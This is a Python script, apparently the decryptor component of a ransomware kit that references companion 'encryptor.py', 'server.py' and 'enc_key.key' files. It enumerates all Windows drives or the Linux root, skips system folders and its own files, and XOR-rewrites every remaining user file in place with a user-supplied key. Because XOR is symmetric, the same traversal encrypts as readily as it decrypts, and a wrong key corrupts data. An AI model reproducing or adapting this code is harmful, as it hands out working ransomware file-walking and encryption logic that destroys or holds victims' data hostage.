#!/usr/bin/env python3

import time
import os
import socket




def decrypt(key,file):
    try:
        with open(file,"rb") as target_file:
            
            print(f"[+] decrypting {file}")
            result=bytearray()
            data=target_file.read()
            for i in range(len(data)):
                result.append(data[i] ^ key[i % len(key)])
        
        with open(file,"wb") as target_file:
            target_file.write(bytes(result))
            print(f"[+] {file} decrypted successfully")
            
    except Exception as e:
        print(f"[x] failed to decrypt {file}... error: {e}")



def check_os():
    if os.name == "nt":
        return 0
    elif os.name == "posix":
        return 1
    else:
        return 2

if __name__ == "__main__":
        
    if check_os() == 0:
        #windows
        os.system("cls")
        hex_key=input("enter the decryption key: ")
        key=bytes.fromhex(hex_key)
        file_paths=[]
        possible_root_path = [
            "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/", "H:/", 
            "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/", 
            "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/", 
            "Y:/", "Z:/"
        ]        
        actual_root_path=[]
        required_paths=[]
        excluded_paths=[
        "C:/Windows", "C:/Program Files", 
        "C:/Program Files (x86)"
        ]
        files_processed=0
        folders_processed=0
        counter=0
        
        for i in range(len(possible_root_path)):
            if os.path.exists(possible_root_path[i]):
                actual_root_path.append(possible_root_path[i])

        
        '''
        #debug
        for item in actual_root_path:
            print(item)
        '''
        for root_dir in actual_root_path:
            for item in os.listdir(root_dir):
                is_excluded=False
                for excluded_path in excluded_paths:
                    if excluded_path in item:
                        is_excluded=True
                        #print(f"[+] excluded {item}")
                        break
                if not is_excluded:
                    folders_processed+=1
                    print(f"\r[+] added {folders_processed} folders...",end='')
                    required_paths.append(os.path.join(root_dir,item))
        print("\n")
        for item in required_paths:
            print(f"REQUIRED PATH ===> {item}")
        
        
        for required_path in required_paths:
            for dirpath,dirnames,filenames in os.walk(required_path,topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "enc_key.key":
                        continue
                    file_paths.append(os.path.join(dirpath,filename))
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
          
        
        for item in file_paths:
            #print(item) #debug
            decrypt(key,item)
           

        
       
    elif check_os() == 1:
        #linux
        os.system("clear")
        hex_key=input("enter the decryption key: ")
        key=bytes.fromhex(hex_key)
        file_paths=[]
        threads=[]
        root_dir="/"
        required_paths=[]
        excluded_paths=[
        "bin","sbin","lib",
        "lib64","sys","opt",
        "var","etc","proc",
        "usr","run","mnt",
        "media","dev","tmp",
        "boot","snap","srv",
        "snap"
        ]
        files_processed=0
        folders_processed=0
        counter=0
        
        '''
        #debug
        for item in actual_root_path:
            print(item)
        '''
        
        for item in os.listdir(root_dir):
            is_excluded=False
            for excluded_path in excluded_paths:
                if excluded_path in item:
                    is_excluded=True
                    #print(f"[+] excluded {item}")
                    break
            if not is_excluded:
                folders_processed+=1
                print(f"\r[+] added {folders_processed} folders...",end='')
                required_paths.append(os.path.join(root_dir,item))
        print("\n")
        for item in required_paths:
            print(f"REQUIRED PATH ===> {item}")
        
        
        for required_path in required_paths:
            for dirpath,dirnames,filenames in os.walk(required_path,topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "enc_key.key" or filename == ".bashrc" or filename == ".sudo_as_admin_successful" or filename == ".profile" or filename == ".bash_logout" or filename == ".python_history":
                        continue
                    if ".cache" in dirpath or ".config" in dirpath or "snap" in dirpath or ".ssh" in dirpath or ".local" in dirpath or ".gnupg" in dirpath:
                        continue
                    file_paths.append(os.path.join(dirpath,filename))
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
        print("\n")
            
        for item in file_paths:
            #print(item) #debug
            decrypt(key,item)
           
            
        
      
    else:
        print("[x] the os is not supported..")
        exit(1)

